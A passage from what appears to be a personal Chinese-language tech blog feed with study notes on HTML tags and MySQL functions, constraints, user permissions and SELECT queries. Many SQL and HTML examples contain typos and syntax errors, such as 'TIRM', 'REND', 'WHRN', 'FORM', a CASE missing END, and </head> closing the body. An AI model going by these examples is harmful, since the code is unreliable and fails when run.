class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;My First HTML Page&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;Hello World!&lt;/h1&gt;</span><br><span class="line">        &lt;ol&gt;</span><br><span class="line">            &lt;li&gt;</span><br><span class="line">                结构</span><br><span class="line">            &lt;/li&gt;</span><br><span class="line">            &lt;li&gt;</span><br><span class="line">                aaa</span><br><span class="line">            &lt;/li&gt;</span><br><span class="line">        &lt;/ol&gt;</span><br><span class="line">        &lt;p&gt;This is my &lt;font color=&quot;&#x27;red&quot;&gt;first&lt;/font&gt; HTML page.&lt;/p&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.无序列表</p><p>ul</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;My First HTML Page&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;Hello World!&lt;/h1&gt;</span><br><span class="line">        &lt;ul&gt;</span><br><span class="line">            &lt;li&gt;</span><br><span class="line">                结构</span><br><span class="line">            &lt;/li&gt;</span><br><span class="line">            &lt;li&gt;</span><br><span class="line">                aaa</span><br><span class="line">            &lt;/li&gt;</span><br><span class="line">        &lt;/ul&gt;</span><br><span class="line">        &lt;p&gt;This is my &lt;font color=&quot;&#x27;red&quot;&gt;first&lt;/font&gt; HTML page.&lt;/p&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3.定义列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;/dl&gt;</span><br><span class="line">    &lt;dl&gt;</span><br><span class="line">        &lt;dt&gt;</span><br><span class="line">            aa</span><br><span class="line">        &lt;/dt&gt;</span><br><span class="line">        &lt;dd&gt;</span><br><span class="line">            aaa</span><br><span class="line">        &lt;/dd&gt;</span><br><span class="line">    &lt;/dl&gt;</span><br></pre></td></tr></table></figure><p>dt表示定义的内容</p><p>dd表示定义的解释</p><p><strong>ul是用的比较多的</strong></p><p><strong>列表之间是可以互相嵌套的</strong></p><h2 id="超链接">超链接</h2><p>可以从一个界面跳转到另一个界面，是一个行内元素，可以嵌套任何元素，除了他自身。</p><p>使用<a>，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;My First HTML Page&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;Hello World!&lt;/h1&gt;</span><br><span class="line">        &lt;p&gt;This is my &lt;font color=&quot;&#x27;red&quot;&gt;first&lt;/font&gt; HTML page.&lt;/p&gt;</span><br><span class="line">        &lt;a href=&quot;https://mengnankk.asia&quot;&gt;mengnankk&lt;/a&gt;</span><br><span class="line">        &lt;a href=&quot;https://mengnankk.asia&quot;&gt;mengnankkk&lt;/a&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>herf属性存放跳转到链接（内部外部都可以）,这是<a>标签最重要的属性</strong>，<strong>也能跳转到页面的其他位置</strong></p><p>相对链接</p><p><strong>./默认不写…/是上个文件路径</strong></p><p>不是跳转是新建</p><p>target属性</p><p>_self是默认值，在当前页面中打开链接</p><p>_blank是在新的页面中打开链接</p><p>回到顶部的效果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;#&quot; target=&quot;_blank&quot; &gt;wwwww&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>回到页面的任意位置效果：</p><p>使用id属性，是唯一不重复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;My First HTML Page&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;Hello World!&lt;/h1&gt;</span><br><span class="line">        &lt;p&gt;This is my &lt;font color=&quot;&#x27;red&quot;&gt;first&lt;/font&gt; HTML page.&lt;/p&gt;</span><br><span class="line">        &lt;a href=&quot;#botter&quot;&gt;wwwww&lt;/a&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;a href=&quot;../&quot;&gt;&lt;/a&gt;</span><br><span class="line">        &lt;a href=&quot;../&quot;&gt;&lt;/a&gt;</span><br><span class="line">        &lt;a href=&quot;../&quot;&gt;&lt;/a&gt;</span><br><span class="line">        &lt;a href=&quot;../&quot;&gt;&lt;/a&gt;</span><br><span class="line">        &lt;a href=&quot;../&quot;&gt;&lt;/a&gt;</span><br><span class="line">        &lt;a href=&quot;../&quot;&gt;&lt;/a&gt;</span><br><span class="line">        &lt;a href=&quot;../&quot;&gt;&lt;/a&gt;</span><br><span class="line">        &lt;a id=&quot;botter&quot; href=&quot;#&quot;&gt;???&lt;/a&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在开发中#作为超链接的占字符</p><p>什么用也没有的超链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:;&quot;&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure><h2 id="图片标签">图片标签</h2><p>引入外部的图片，属于替换元素，介于块元素和行内元素中间，具有两种元素的特点</p><p>使用<img>标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;#&quot;&gt;</span><br></pre></td></tr></table></figure><img src="https://imgbed.mengnankk.asia/202407131915645.jpg"><p>alt属性是对图片的描述，描述默认情况下不会显示，无法加载的时候会出现。搜索引擎会根据这个搜索的</p><p>width宽度属性</p><p>height高度属性</p><p>值改变一个属性的时候，宽度和高度会等比例的改变。<strong>在pc端中</strong><strong><strong>一般不建议在浏览器中修改，在移动端中就需要修改</strong></strong></p><h2 id="图片的格式">图片的格式</h2><p>jpg:支持的颜色丰富，不支持透明，不支持动图 一般用来显示照片</p><p>gif：支持的颜色比较少，支持简单的透明，支持动图颜色单一的图片/动图</p><p>png：支持的颜色丰富，支持复杂透明，不支持动图颜色丰富，颜色复杂的图片/专为网页而生</p><p>webp:专门用来表示网页，有其他图片格式的所有有点，文件还特别小</p><p><strong>效果一样用占的小的。</strong></p><p>也可以用base64来快速加载</p><h2 id="内联框架">内联框架</h2><p>用于向当前页面中引入别的网站</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;aaaaaa&quot; width=&quot;500&quot; height=&quot;500&quot; frameborder=&quot;0&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><iframe src="http://mengnankk.asia" width="500" height="500" frameborder="0"></iframe><h2 id="音乐视频播放">音乐视频播放</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio src=&quot;&quot; controls autoplay loop&gt;&lt;/audio&gt;</span><br><span class="line">&lt;video src=&quot;&quot; controls&gt;&lt;/video&gt;</span><br></pre></td></tr></table></figure><p>音视频文件引入时，不允许用户播放停止的</p><p>引入controls用来控制</p><p>loop属性用来控制循环播放</p><p><strong>autoplay用来自动播放，如果设置了，则音乐在打开页面时会进行播放，但大部分浏览器不会自动播放</strong></p><p>还可以通过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio controls&gt;</span><br><span class="line">浏览器不支持请更换浏览器</span><br><span class="line">            &lt;source src=&quot;&quot;&gt;</span><br><span class="line">            &lt;source src=&quot;&quot;&gt;</span><br><span class="line">            &lt;source src=&quot;&quot;&gt;</span><br><span class="line">        &lt;/audio&gt;</span><br></pre></td></tr></table></figure><audio controls>浏览器不支持请更换浏览器            <source src="">            <source src="">            <source src="">        </audio><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;embed src=&quot;&quot; type=&quot;&quot;&gt;</span><br></pre></td></tr></table></figure><embed src="" type=""><p>还可以通过这个标签进行使用</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 函数</title>
      <link href="/2024/07/11/mysql4/"/>
      <url>/2024/07/11/mysql4/</url>
      
        <content type="html"><![CDATA[<h1>MYSQL函数&amp;&amp;约束</h1><h2 id="函数">函数</h2><p>函数是指一段可以直接被另一程序调用的程序或者代码</p><h3 id="字符串函数">字符串函数</h3><p>CONCAT(S1,S2…)将字符串拼接，S1,S2…拼接成一个字符串</p><p>LOWER(STR) 将STR全部转变为小写</p><p>UPPER(STR)将STR全部转变为大写</p><p>LPAD(STR,N,PAD)左填充，用字符串PAD对STR的左边进行填充，达到n个字符串的长度</p><p>RPAD(STR,N,PAD)右填充，用字符串PAD对STR的右边进行填充，达到n个字符串的长度</p><p>TRIM(STR)去掉字符串头部和尾部的空格</p><p>SUBSTRING(STR,START,LEN)返回从字符串str从start位置起的len个长度的字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT CONCAT(&#x27;HELLO&#x27;,&#x27;MYSQL&#x27;);</span><br><span class="line">#HELLO MYSQL</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT LPAD(&#x27;01&#x27;,5,&#x27;-&#x27;);#---01</span><br><span class="line">SELECT RPAD(&#x27;01&#x27;,5,&#x27;-&#x27;);#01---</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT TIRM(&#x27; HELLO MYSQL &#x27;);</span><br><span class="line">#HELLO MYSQL</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUBSTRING(&#x27;HELLO MYSQL&#x27;,1,5);</span><br><span class="line">这个函数是从1开始的</span><br><span class="line">#HELLO</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE EMP SELECT WORKNO = LPAD(&#x27;1&#x27;,5,&#x27;0&#x27;);#00001</span><br></pre></td></tr></table></figure><h3 id="数值函数">数值函数</h3><p>CEIL(X) 向上取值</p><p>FLOOR(X）向下取值</p><p>MOD(X,Y)返回x/y的模</p><p>REND()返回0~1的随机数</p><p>ROUND(X,Y)求参数x的四舍五入值，保留y位小数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT CEIL(1.5);#2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LPAD(ROUND(REND()*1000000,0),6,&#x27;0&#x27;);</span><br></pre></td></tr></table></figure><h3 id="日期函数">日期函数</h3><p>CURDATE()返回当前的日期</p><p>CURTIME()返回当前的时间</p><p>NOW()返回当前的日期和时间</p><p>YEAR(DATE)获取指定的年份</p><p>MONTH(DATE)获取指定的月份</p><p>DAY(DATE)获取指定的日期</p><p>DATE_ADD(DATE,INTERVAL EXPR TYPE)返回一个日期/时间值，加上一个时间间隔expr后的时间值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DATE_ADD(NOW(),INTERVAL 70 YEAR);</span><br></pre></td></tr></table></figure><p>DATEDIFF(DATE1,DATE2)返回起始时间date1和结束时间date2之间的天数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT NAME, DATEDIFF(CURDATE(), DATE) AS TIANSHU</span><br><span class="line">FROM EMP</span><br><span class="line">ORDER BY TIANSHU DESC;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="流程函数">流程函数</h3><p>IF (VALUE,T,F)如果value为true则返回t，否则返回f</p><p>IFNULL(VALUE1,VALUE2)如果value1不为空则返回value1否则则返回value2</p><p>CASE WHEN [VAL1] THEN [RES1]…ELSE [DEFAULT] END 如果val1为true，则返回res1。。否则则返回default默认值</p><p>CASE【expr】 WHEN [VAL1] THEN [RES1]…ELSE [DEFAULT] END 如果expr的值为val1，则返回res1。。否则则返回default默认值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT NAME,</span><br><span class="line">(CASE WORK WHEN &#x27;BEIJING&#x27; THEN &#x27;1&#x27; WHRN &#x27;SHANGHAI&#x27; THEN &#x27;1&#x27; ELSE &#x27;2&#x27;) AS &#x27;ADDRESS&#x27;</span><br><span class="line">FROM EMP;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT NAME,</span><br><span class="line">(CASE WHEN MATH &gt;= 85 THEN &#x27;A&#x27; WEHN MATH &gt;=60 THEN &#x27;B&#x27; ELSE &#x27;C&#x27; AND) &#x27;数学&#x27;,</span><br><span class="line">FROM EMP;</span><br></pre></td></tr></table></figure><h2 id="约束">约束</h2><p>概述：作用于表中字段上的规则，限制储存在表中的数据。</p><p>非空约束 限制该字段的数据不能为null   <strong>not null</strong></p><p>唯一约束 保证该字段的所有数据都是唯一的 <strong>unique</strong></p><p>主键约束 主键是一行数据的所有数据，要求非空且唯一 <strong>primary key</strong></p><p>默认约束 保存数据时未指定该数据，采用默认值 <strong>default</strong></p><p>检查约束 保证该字段满足某一个条件 <strong>check</strong></p><p>外键约束 两张表的数据建立联系，保证数据的一致性和完整性 <strong>foreign key</strong></p><p>实例:一个字段可添加多个约束</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">primary key,auto_incerment#主键 自动增长</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE user (</span><br><span class="line">    id INT PRIMARY KEY AUTO_INCREMENT COMMENT &#x27;主键&#x27;,</span><br><span class="line">    name VARCHAR(10) NOT NULL UNIQUE COMMENT &#x27;姓名&#x27;,</span><br><span class="line">    age INT CHECK (age &gt; 0 AND age &lt;= 120) COMMENT &#x27;年龄&#x27;,</span><br><span class="line">    status CHAR(1) DEFAULT &#x27;1&#x27; COMMENT &#x27;状态&#x27;,</span><br><span class="line">    gender CHAR(1) COMMENT &#x27;性别&#x27;</span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inserrt into user(name,age,status,gender) values (&#x27;tom1&#x27;,&#x27;19&#x27;,&#x27;1&#x27;,&#x27;nan&#x27;);</span><br></pre></td></tr></table></figure><p>外键约束</p><p>具有外键的叫做子表，没有的叫作父表。这是一个逻辑关系</p><p>保证数据的一致性和完整性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table table_name()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table emp add_constraint fk_emp_dept_id foregin key (dept_id) references dept(id);</span><br></pre></td></tr></table></figure><ul><li><p>emp表名</p></li><li><p>fk是foregin key缩写</p></li><li><p>dept_id表的列</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table emp drop foregin key fk_emp_dept_id;</span><br></pre></td></tr></table></figure><p>外键的约束删除和更新</p><p>no action父表中删除更新时，是否有对应的外键，如果有则不允许更新删除</p><p>restrict父表中删除更新时，是否有对应的外键，如果有则不允许更新删除</p><p>cascade父表和子表对应的字段同步</p><p>set null父表进行更新或者删除的时候，是否有对应的外键，有则设置子表对应的外键为null</p><p>set default</p>]]></content>
      
      
      <categories>
          
          <category> sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql DCL</title>
      <link href="/2024/07/09/mysql3/"/>
      <url>/2024/07/09/mysql3/</url>
      
        <content type="html"><![CDATA[<h1>DCL(数据库管理)</h1><p>介绍：数据控制语言，控制数据库的用户，控制数据库的访问</p><h2 id="用户管理">用户管理</h2><p>1.查询用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">USE MYSQL;</span><br><span class="line">SELECT * FORM USER;</span><br></pre></td></tr></table></figure><p>用用户名和主机地址确定一个用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE USER &#x27;USERNAME&#x27;@&#x27;LOCALHOST&#x27; IDENTIFLED BY &#x27;PASSWPRD&#x27;;</span><br></pre></td></tr></table></figure><p>任意主机都可访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE USER &#x27;USERNAME&#x27;@&#x27;%&#x27; IDENTIFLED BY &#x27;PASSWPRD&#x27;;</span><br></pre></td></tr></table></figure><p>2.修改用户密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER USER &#x27;USERNAME&#x27;@&#x27;主机名&#x27; IDENTIFIED WITH MYSQL_NATIVE_PASSWORD BY &#x27;PASSWORD&#x27;;</span><br></pre></td></tr></table></figure><p>修改mysql本地连接的密码</p><p>3.删除用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP USER &#x27;USERNAME&#x27;@&#x27;主机名&#x27;;</span><br></pre></td></tr></table></figure><p>主机可以使用通配符%</p><h2 id="权限控制">权限控制</h2><p>权限：</p><p>ALL</p><p>SELECT</p><p>INSERT</p><p>UPDATE</p><p>DELETE</p><p>ALTER</p><p>DROP</p><p>CREATE</p><p>1.查询权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW GRANTS FOR &#x27;USERNAME&#x27;@&#x27;LOCALHOST&#x27;;</span><br></pre></td></tr></table></figure><p>2.授予权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRANT 权限列表 ON DATEBASE_NAME.TABLE_NAME TO &#x27;USERNAME&#x27;@&#x27;LOCALHOST&#x27;;</span><br></pre></td></tr></table></figure><p>3.撤销权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REVOKE 权限列表 ON DATEBASE_NAME.TABLE_NAME FROM &#x27;USERNAME&#x27;@&#x27;LOCALHOST&#x27;;</span><br></pre></td></tr></table></figure><ol start="4"><li></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;mengnankk&#x27;@&#x27;localhost&#x27; WITH GRANT OPTION;</span><br></pre></td></tr></table></figure><p><img src="https://imgbed.mengnankk.asia/202407081551504.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql DQL</title>
      <link href="/2024/07/08/mysql2/"/>
      <url>/2024/07/08/mysql2/</url>
      
        <content type="html"><![CDATA[<h1>DQL(数据库的查询)</h1><h2 id="查询语法">查询语法</h2><p>查询关键词：SELECT</p><p>语言结构：（编写顺序）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SELECT 字段列表</span><br><span class="line">FROM 表名查询</span><br><span class="line">WHERE 条件列表</span><br><span class="line">GROUP BY 分组字段列表</span><br><span class="line">HAVING 分组后条件列表</span><br><span class="line">ORDER BY 排序字段列表</span><br><span class="line">LIMIT 分页参数</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="基础查询">基础查询</h2><p>1.查询多个字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT 字段列表(1),字段列表(2)...FRIM TABLE_NAME; 某个字段查询</span><br><span class="line"></span><br><span class="line">SELECT * FROM TABLE_NAME; 全字段查询#实际开放中不要使用</span><br></pre></td></tr></table></figure><p>2.设置别名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 字段列表  &#x27;别名&#x27; FROM TABLE_NAME;</span><br></pre></td></tr></table></figure><p>3.去除重复记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DISTINCE 字段列表 &#x27;别名&#x27; FROM TABLE_NAME;</span><br></pre></td></tr></table></figure><h2 id="条件查询">条件查询</h2><p>1.语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 字段列表 FROM WHERE 条件列表;</span><br></pre></td></tr></table></figure><p>下表中实例假定 A 为 10, B 为 20</p><table><thead><tr><th style="text-align:left">操作符</th><th style="text-align:left">描述</th><th style="text-align:left">实例</th></tr></thead><tbody><tr><td style="text-align:left">=</td><td style="text-align:left">等号，检测两个值是否相等，如果相等返回true</td><td style="text-align:left">(A = B) 返回false。</td></tr><tr><td style="text-align:left">&lt;&gt;, !=</td><td style="text-align:left">不等于，检测两个值是否相等，如果不相等返回true</td><td style="text-align:left">(A != B) 返回 true。</td></tr><tr><td style="text-align:left">&gt;</td><td style="text-align:left">大于号，检测左边的值是否大于右边的值, 如果左边的值大于右边的值返回true</td><td style="text-align:left">(A &gt; B) 返回false。</td></tr><tr><td style="text-align:left">&lt;</td><td style="text-align:left">小于号，检测左边的值是否小于右边的值, 如果左边的值小于右边的值返回true</td><td style="text-align:left">(A &lt; B) 返回 true。</td></tr><tr><td style="text-align:left">&gt;=</td><td style="text-align:left">大于等于号，检测左边的值是否大于或等于右边的值, 如果左边的值大于或等于右边的值返回true</td><td style="text-align:left">(A &gt;= B) 返回false。</td></tr><tr><td style="text-align:left">&lt;=</td><td style="text-align:left">小于等于号，检测左边的值是否小于或等于右边的值, 如果左边的值小于或等于右边的值返回true</td><td style="text-align:left">(A &lt;= B) 返回 true。</td></tr></tbody></table><p>条件还可以包括逻辑运算</p><p>AND &amp;&amp;#和</p><p>OR ||#或</p><p>NOT ! #非</p><ol start="2"><li></li></ol><p>判断NULL使用IS NULL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM TABLE_NAME WHERE 字段列表 IS NULL;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM TABLE_NAME WHERE 字段列表 IS NOT NULL;</span><br></pre></td></tr></table></figure><p>3.BETWEEN AND</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM TABLE_NAME WHERE 字段列表 BETWEEN A AND B;#B&gt;A</span><br></pre></td></tr></table></figure><p><a href="http://4.IN">4.IN</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM TABLE_NAME WHERE 字段列表 IN(A,B,C);</span><br></pre></td></tr></table></figure><p>5.LIKE</p><p>(_匹配单个字符，%匹配任意个字符)</p><p>通配符 <code>%</code> 的作用是匹配零个或多个字符。例如：</p><ul><li><strong><code>'j%'</code>：匹配以 ‘j’ 开头的所有字符串。</strong></li><li><strong><code>'%j'</code>：匹配以 ‘j’ 结尾的所有字符串。</strong></li><li><strong><code>'%j%'</code>：匹配包含 ‘j’ 的所有字符串。</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM TABLE_NAME WHERE 字段列表 LIKE &#x27;__&#x27;;</span><br></pre></td></tr></table></figure><p>查询字段列表为两个的数据</p><h2 id="聚合函数">聚合函数</h2><p>介绍：<strong>一列数据作为一个整体，进行纵向计算</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">COUNT #统计数量</span><br><span class="line">MAX </span><br><span class="line">MIN</span><br><span class="line">AVG #平均值</span><br><span class="line">SUM #求和</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(字段列表) FROM TABLE_NAME;#NULL值不参与计算;</span><br></pre></td></tr></table></figure><p><strong>#NULL值不参与计算</strong></p><h2 id="分组查询">分组查询</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 字段列表 FROM TABLE_NAME WHERE 条件 GROUP BY HAVING 分组后过滤的条件;</span><br></pre></td></tr></table></figure><ul><li><p><strong>WHERE 条件分组前过滤，HAVING 分组后进行过滤</strong></p></li><li><p><strong>WHERE 不能对聚合函数进行判断 HAVING 可以</strong></p></li><li><p><strong>执行顺序：WHERE &gt;聚合函数&gt;HAVING</strong></p></li><li><p><strong>分组后，查询的字段一般为聚合函数和分组字段，查询其他字段无任何意义</strong></p></li></ul><p>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 